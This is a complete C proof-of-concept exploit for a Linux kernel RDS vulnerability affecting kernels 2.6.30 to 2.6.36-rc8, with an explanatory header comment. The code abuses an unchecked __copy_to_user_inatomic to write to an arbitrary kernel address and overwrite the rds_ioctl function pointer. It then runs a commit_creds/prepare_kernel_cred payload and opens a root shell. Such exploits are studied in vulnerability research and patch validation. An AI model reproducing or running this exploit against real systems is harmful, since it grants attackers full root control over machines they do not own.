/**
 * Advisory:
 *   http://www.vsecurity.com/resources/advisory/20101019-1/
 *
 * Vulnerable kernels: 2.6.30 - 2.6.36-rc8
 * Tested on:
 *   Linux ubuntu 2.6.32-24-generic i686 GNU/Linux
 *   Linux ubuntu 2.6.31-14-generic x86_64 GNU/Linux
 *   Fedora 14 2.6.35.6-45.fc15.i686
 *   Fedora 14 2.6.35.6-45.fc15.x86_64
 *   OpenSUSE Linux linux-e5s5 2.6.34-12-desktop i386 GNU/Linux
 *
 * Author: Agustin Gianni (agustin@immunityinc.com)
 *
 * This bug gives us a write anywhere primitive. The issue is inside
 * the rds_page_copy_user function. To try to improve performance (my guess)
 * they used __copy_to_user_inatomic to copy data to userland. This function
 * performs less checks than copy_to_user so the kernel must me certain that
 * the destination address is in userland. In this case the address is not
 * (ie. no access_ok call).
 *
 * int rds_page_copy_user(struct page *page, unsigned long offset,
 *                     void __user *ptr, unsigned long bytes,
 *                     int to_user)
 * {
 *         unsigned long ret;
 *         void *addr;
 *
 *         if (to_user)
 *                 rds_stats_add(s_copy_to_user, bytes);
 *         else
 *                 rds_stats_add(s_copy_from_user, bytes);
 *
 *         addr = kmap_atomic(page, KM_USER0);
 *         if (to_user)
 *                 ret = __copy_to_user_inatomic(ptr, addr + offset, bytes);
 *         else
 *                 ret = __copy_from_user_inatomic(addr + offset, ptr, bytes);
 *         kunmap_atomic(addr, KM_USER0);
 *
 *         if (ret) {
 *                 addr = kmap(page);
 *                 if (to_user)
 *                         ret = copy_to_user(ptr, addr + offset, bytes);
 *                 else
 *                         ret = copy_from_user(addr + offset, ptr, bytes);
 *                 kunmap(page);
 *                 if (ret)
 *                         return -EFAULT;
 *         }
 *
 *         return 0;
 * }
 *
 * Magic: ret = __copy_to_user_inatomic(ptr, addr + offset, bytes);
 * So thats the line that messes up. Now we have to find how to call it with controlled values.
 * The cross references shows that is called in many places:
 *
 * rds_ib_inc_copy_to_user      <- meh
 * rds_iw_inc_copy_to_user      <- meh
 * rds_message_inc_copy_to_user <- win
 *
 *  struct rds_transport rds_loop_transport = {
 *     .xmit             = rds_loop_xmit,
 *     .xmit_cong_map    = rds_loop_xmit_cong_map,
 *     .recv             = rds_loop_recv,
 *     .conn_alloc       = rds_loop_conn_alloc,
 *     .conn_free        = rds_loop_conn_free,
 *     .conn_connect     = rds_loop_conn_connect,
 *     .conn_shutdown    = rds_loop_conn_shutdown,
 *     .inc_copy_to_user = rds_message_inc_copy_to_user, << Here we go.
 *     .inc_purge        = rds_message_inc_purge,
 *     .inc_free         = rds_message_inc_free,
 *     .t_name           = "loopback",
 * };
 *
 * Now we find our vector (with pure RE magic, ie. grep):
 *
 * int rds_recvmsg(struct kiocb *iocb, struct socket *sock, struct msghdr *msg,
 *         size_t size, int msg_flags)
 * {
 * ...
 *      rdsdebug("copying inc %p from %pI4:%u to user\n", inc,
 *              &inc->i_conn->c_faddr,
 *              ntohs(inc->i_hdr.h_sport));
 *         ret = inc->i_conn->c_trans->inc_copy_to_user(inc, msg->msg_iov,
 *                                  size);
 *
 * struct iovec
 * {
 *     void __user *iov_base;
 *     __kernel_size_t iov_len;
 * };
 *
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/utsname.h>

#define RECVPORT 5555
#define SENDPORT 6666

static unsigned long get_kernel_sym(char *name);

static int get_socket(int port)
{
    struct sockaddr_in addr;
    int fd;

    fd = socket(PF_RDS, SOCK_SEQPACKET, 0);
    if(fd == -1)
    {
        perror("get_socket::socket: Error creating RDS socket");
        return -1;
    }

    memset(&addr, 0, sizeof(addr));

    inet_aton("127.0.0.1", &addr.sin_addr);
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(port);

    if(bind(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        perror("get_socket::bind: Could not bind socket.");
        return -1;
    }

    return fd;
}

static int write_to(unsigned long address, unsigned long value, int read_sock, int write_sock)
{
    struct iovec vector;
    struct msghdr msg;
    struct sockaddr_in addr;

    unsigned long buf = value;
    
    /// Just to keep things sane.
    memset(&vector, 0, sizeof(struct iovec));
    memset(&msg,    0, sizeof(struct msghdr));
    memset(&addr,   0, sizeof(struct sockaddr_in));

    /// Fill the address of the endpoint.
    addr.sin_port   = htons(RECVPORT);
    addr.sin_family = AF_INET;
    inet_aton("127.0.0.1", &addr.sin_addr);

    /// This is the DWORD to copy.
    vector.iov_base = &buf;
    vector.iov_len  = sizeof(buf);

    /// Build the message to send.
    msg.msg_name    = &addr;
    msg.msg_namelen = sizeof(struct sockaddr_in);
    msg.msg_iov     = &vector;
    msg.msg_iovlen  = 1;

    /// Send the value we want to write.
    if(sendmsg(write_sock, &msg, 0) == -1)
    {
        perror("write_to::sendmsg: Error sending message");
        return -1;
    }

    sleep(1);

    /// Write what is in the buffer to address 'address'
    if(recvfrom(read_sock, (void *) address, sizeof(void *), 0, NULL, NULL) == -1)
    {
        perror("write_to::recvfrom: Error receiving message");
        return -1;
    }

    return 0;
}

typedef int __attribute__((regparm(3))) (* pcommit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* pprepare_kernel_cred)(unsigned long cred);
pcommit_creds commit_creds;
pprepare_kernel_cred prepare_kernel_cred;

int __attribute__((regparm(3)))
payload(void * file, void * vma)
{
    commit_creds(prepare_kernel_cred(0));
    return -1;
}

int main(int argc, char **argv)
{
    int read_sock;
    int write_sock;

    unsigned long sock_ops;     /// rds_proto_ops structure address.
    unsigned long o_rds_ioctl;  /// original pointer to rds_ioctl function.
    unsigned long rds_ioctl;    /// address of func pointer to overwrite.

    /// The read socket is used to trigger the 'copy to anywhere'.
    read_sock = get_socket(RECVPORT);

    /// The write socket is used to supply the contents to write.
    write_sock = get_socket(SENDPORT);

    /// The socket call triggers the load of the rds modules
    if(read_sock == -1 || write_sock == -1)
    {
        printf("Failed to open sockets. Maybe we should try a different port?\n");
        return -1;
    }

    /// We are going to overwrite relative to the rds_proto_ops structure.
    sock_ops            = get_kernel_sym("rds_proto_ops");
    o_rds_ioctl         = get_kernel_sym("rds_ioctl");

    /// Used to get privileges.
    commit_creds        = (pcommit_creds) get_kernel_sym("commit_creds");
    prepare_kernel_cred = (pprepare_kernel_cred) get_kernel_sym("prepare_kernel_cred");

    if(!sock_ops || !o_rds_ioctl || !commit_creds || !prepare_kernel_cred)
    {
        printf("Failed to resolve kernel symbols.\n");
        return -1;
    }

    /// At offset 9 there is a function pointer to ioctl.
    rds_ioctl = sock_ops + 9 * sizeof(void *);

    printf("Overwriting rds_ioctl function pointer\n");
    if(write_to(rds_ioctl, (unsigned long) &payload, read_sock, write_sock) == -1)
    {
        printf("The exploit failed\n");
        return -1;
    }

    printf("Executing payload\n");
    ioctl(write_sock, 0, NULL);

    printf("Restoring original value of rds_ioctl function pointer");
    if(write_to(rds_ioctl, o_rds_ioctl, read_sock, write_sock) == -1)
    {
        printf("The exploit failed\n");
        return -1;
    }

    if(getuid() != 0)
    {
        printf("Exploit failed elevating privileges.\n");
        return -1;
    }

    execl("/bin/sh", "sh", NULL);

    return 0;
}

/// Spenders get_kernel_sym from enlightenment.
static unsigned long get_kernel_sym(char *name)
{
    FILE *f;
    unsigned long addr;
    char dummy;
    char sname[512];
    struct utsname ver;
    int ret;
    int rep = 0;
    int oldstyle = 0;

    f = fopen("/proc/kallsyms", "r");
    if (f == NULL) {
        f = fopen("/proc/ksyms", "r");
        if (f == NULL)
            goto fallback;
        oldstyle = 1;
    }

repeat:
    ret = 0;
    while(ret != EOF) {
        if (!oldstyle)
            ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
        else {
            ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
            if (ret == 2) {
                char *p;
                if (strstr(sname, "_O/") || strstr(sname, "_S."))
                    continue;
                p = strrchr(sname, '_');
                if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
                    p = p - 4;
                    while (p > (char *)sname && *(p - 1) == '_')
                        p--;
                    *p = '\0';
                }
            }
        }
        if (ret == 0) {
            fscanf(f, "%s\n", sname);
            continue;
        }
        if (!strcmp(name, sname)) {
            fprintf(stdout, "Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : "");
            fclose(f);
            return addr;
        }
    }

    fclose(f);
    if (rep)
        return 0;
fallback:
    uname(&ver);
    if (strncmp(ver.release, "2.6", 3))
        oldstyle = 1;
    sprintf(sname, "/boot/System.map-%s", ver.release);
    f = fopen(sname, "r");
    if (f == NULL)
        return 0;
    rep = 1;
    goto repeat;
}
